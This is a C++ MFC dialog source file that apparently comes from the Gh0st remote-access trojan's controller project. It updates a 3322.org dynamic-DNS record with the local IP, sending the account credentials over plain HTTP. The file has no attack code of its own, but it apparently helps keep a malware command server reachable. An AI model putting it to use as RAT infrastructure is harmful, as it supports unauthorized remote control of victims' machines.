// Ip3322Dlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "Ip3322Dlg.h"
#include <winsock2.h>
#include <wininet.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CIp3322Dlg dialog


CIp3322Dlg::CIp3322Dlg(CWnd* pParent /*=NULL*/)
	: CDialog(CIp3322Dlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CIp3322Dlg)
	m_strname = _T("***");
	m_strym = _T("***.3322.org");
	m_strpass = _T("***");
	//}}AFX_DATA_INIT
}


void CIp3322Dlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CIp3322Dlg)
	DDX_Control(pDX, IDC_COMBO2, m_cmbIP);
	DDX_Control(pDX, IDC_ym, m_editym);
	DDX_Control(pDX, IDC_name, m_editname);
	DDX_Text(pDX, IDC_name, m_strname);
	DDX_Text(pDX, IDC_ym, m_strym);
	DDX_Text(pDX, IDC_PASS, m_strpass);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CIp3322Dlg, CDialog)
	//{{AFX_MSG_MAP(CIp3322Dlg)
	ON_BN_CLICKED(IDC_BUTTON2, OnButton2)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()


BOOL CIp3322Dlg::OnInitDialog()
{

	CDialog::OnInitDialog();
	// TODO: Add extra initialization here
//	SetIcon(m_hIcon, TRUE);			// Set big icon
//	SetIcon(m_hIcon, FALSE);		// Set small icon
//	InitComboBox();
  
	InitLocalIP();
//	mr();
//	ChangeSkin(m_pClientDlg->m_emSkinType);
	
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}



/////////////////////////////////////////////////////////////////////////////
// CIp3322Dlg message handlers

BOOL CIp3322Dlg::InitLocalIP()
{
	char szHostName[MAX_PATH];
	memset(szHostName,0,MAX_PATH);
	if(gethostname(szHostName,MAX_PATH) == SOCKET_ERROR)
		return FALSE;

	struct sockaddr_in dest;
	struct hostent *hostInfo;

	
	if((hostInfo = gethostbyname(szHostName)) != NULL)
	{
		for(int nIndex = 0; hostInfo->h_addr_list[nIndex] != NULL ;nIndex ++)
		{
            memcpy(&(dest.sin_addr), hostInfo->h_addr_list[nIndex],	hostInfo->h_length);
			m_cmbIP.AddString(inet_ntoa(dest.sin_addr));

		}
	}

	m_cmbIP.AddString("0.0.0.0");
	m_cmbIP.SetCurSel(1);


	return FALSE;
}



BOOL CIp3322Dlg::InitComboBox()
{
	return TRUE;
}




void CIp3322Dlg::OnButton2() 
{
	// TODO: Add your control notification handler code here
	UpdateData();
	
	CString strUpdate,strLocalIP;
	m_cmbIP.GetLBText(m_cmbIP.GetCurSel(),strLocalIP);

	strUpdate.Format("http://%s:%s@members.3322.org/dyndns/update?system=dyndns&hostname=%s&myip=%s&wildcard=OFF",
						m_strname,m_strpass,m_strym,strLocalIP);
	
	HINTERNET hNet = ::InternetOpen("3322",							// 當HTTP協議使用時，這個參數隨意賦值 
									PRE_CONFIG_INTERNET_ACCESS,		// 訪問類型指示Win32網絡函數使用登記信息去發現一個服務器。 
									NULL, 
									INTERNET_INVALID_PORT_NUMBER,	// 使用INTERNET_INVALID_PORT_NUMBER相當於提供卻省的端口數。 
									0								// 標誌去指示使用返回句句柄的將來的Internet函數將"不"為回調函數發送狀態信息 
									) ; 
	
	HINTERNET hUrlFile = ::InternetOpenUrl(hNet,					// 從InternetOpen返回的句柄 
									(char *)strUpdate.GetBuffer(MAX_PATH),	// 需要打開的URL 
									NULL,							// 用來向服務器傳送額外的信息,一般為NULL 
									0,								// 用來向服務器傳送額外的信息,一般為 0 
									INTERNET_FLAG_RELOAD,			// InternetOpenUrl行為的標誌 
									0) ;							// 信息將不會被送到狀態回調函數 
	
	CString strMsg; 
	DWORD dwBytesRead = 0; 
	BOOL bRead = ::InternetReadFile(hUrlFile,						// InternetOpenUrl返回的句柄 
									strMsg.GetBuffer(MAX_PATH),		// 保留數據的緩衝區 
									MAX_PATH, 
									&dwBytesRead);					// 指向包含讀入緩衝區字節數的變量的指針; 

	//如果返回值是TRUE，而且這裡指向0，則文件已經讀到了文件的末尾。 
	
	::InternetCloseHandle(hUrlFile); 
	::InternetCloseHandle(hNet); 
	
    if(strMsg.Find("badauth") != -1)
	{
		::MessageBox(NULL,"ID或PASS有誤","更新動態域名",MB_ICONEXCLAMATION | MB_OK);
	}
	else if(strMsg.Find("nohost") != -1)
	{
		::MessageBox(NULL,"DDNS錯誤\n請檢查是否輸入正確","更新動態域名",MB_ICONEXCLAMATION | MB_OK);
	}
	else if(strMsg.Find("good") != -1)
	{
		::MessageBox(NULL,"更新動態域名成功\r","更新動態域名",MB_OK);
	}
	else if(strMsg.Find("!yours") != -1)
	{
		::MessageBox(NULL,"確定本域名是你的？\r","更新動態域名",MB_OK);
	}
	else if(strMsg.Find("nochg") != -1)
	{
		::MessageBox(NULL,"請不要反覆更新\r","更新動態域名",MB_OK);
	}
	else 
	{
		::MessageBox(NULL,"動態域名服務器內部錯誤,請稍候再試","更新動態域名",MB_ICONEXCLAMATION | MB_OK);		
	}

	strMsg.ReleaseBuffer();	
}


